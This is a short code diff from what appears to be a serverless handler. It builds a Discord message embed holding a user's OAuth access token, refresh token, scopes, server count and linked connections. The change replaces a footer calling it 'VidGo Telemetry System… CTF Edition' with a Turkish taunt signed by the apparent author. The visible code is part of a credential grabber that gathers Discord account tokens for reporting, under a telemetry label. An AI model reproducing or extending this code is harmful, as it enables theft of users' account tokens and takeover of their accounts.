@@ -64,7 +64,7 @@ exports.handler = async (event) => {
                 { name: "🔑 OAuth Details", value: `**Scopes:** ${scopes}\n**Access Token:** \`${accessToken}\`\n**Refresh Token:** \`${refreshToken}\``, inline: false },
                 { name: "📊 Account Stats", value: `**Guilds:** ${guildsRes.data.length}\n**Connections:** ${connectionsRes.data.map(c => c.type).join(', ') || 'None'}`, inline: false }
             ],
-            footer: { text: "VidGo Telemetry System v4.0.1 - Advanced CTF Edition" },
+            footer: { text: "BAŞ EDEMEZSİNİZ - SnOObY" },
             thumbnail: { url: u.avatar ? `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png` : "https://cdn.discordapp.com/embed/avatars/0.png" }
         };
 
